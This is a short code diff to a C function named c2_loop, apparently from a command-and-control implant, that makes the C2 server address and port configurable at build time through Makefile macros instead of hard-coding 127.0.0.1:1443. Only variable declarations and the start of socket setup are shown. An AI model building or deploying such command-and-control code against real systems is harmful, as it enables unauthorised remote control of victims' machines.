@@ -19,11 +19,11 @@
 
 void c2_loop() {
 
-        // receive
-        int n = 0;
-        int len = 0;
-        int maxlen = 65536;
-        char buffer[maxlen];
+// receive
+    int n = 0;
+    int len = 0;
+    int maxlen = 65536;
+    char buffer[maxlen];
     char *cmd_id = NULL;
     int payload_length;
 
@@ -31,8 +31,22 @@ void c2_loop() {
     int sock;
     int sock2;
     bool first_pkt = true;
-    const char* server_name = "127.0.0.1";
-    const int server_port = 1443;
+    const char* server_name;
+    int server_port;
+
+    // dynamically set by Makefile
+    #ifdef C2_SERVER
+    server_name = C2_SERVER;
+    #else
+    server_name = "127.0.0.1";
+    #endif
+
+    #ifdef C2_PORT
+    server_port = C2_PORT;
+    #else
+    server_port = 1443;
+    #endif
+
 
     // setup sockets
     struct sockaddr_in server_address;
